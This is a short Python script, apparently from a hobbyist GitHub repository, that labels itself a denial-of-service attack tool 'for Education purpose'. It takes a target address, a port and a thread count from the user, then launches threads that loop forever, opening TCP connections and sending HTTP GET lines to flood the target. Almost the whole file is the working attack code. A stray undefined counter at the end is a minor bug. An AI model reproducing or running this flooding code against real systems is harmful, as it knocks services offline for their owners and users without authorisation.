#!/bin/env python3
#importing libraries
import requests
import socket
import threading ##threading to speed up the process
import os

print("\n\n")
print("         +---------------------------------------+")
print("         |          Apr, 7th, 2024               |")
print("         |  This is a simple DOS attack script   |")
print("         |  Github:https://github.com/alien-keric|")
print("         |      Author: alienX                   |")
print("         |            Version: 2.0               |")
print("         +---------------------------alien-------+")

print("\n\n")


#os.system("clear") 
#os.system("toilet BABY-DDOS")
#print("Author:alienX")
print("For Education purpose >.*.< ")

target = str(input("Enter the target name or ip or domain name or url: "))
port = int(input("Enter the target port number: "))
trd = int(input("Enter the number of threads: "))

##attacking mechanism will be  as follows
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(trd):
    thread = threading.Thread(target=attack)
    thread.start()


global attack_num
attack_num += 1
print(attack_num)

##os.system("clear") 
##os.system("toilet DDOS-BABY")


'''
##sending request to the server

data = {'key1': 'value1', 'key2': 'value2'}

##sending a post to the server
response = requests.post(target, data=data)

##printing the status code
print(response.status_code)
'''

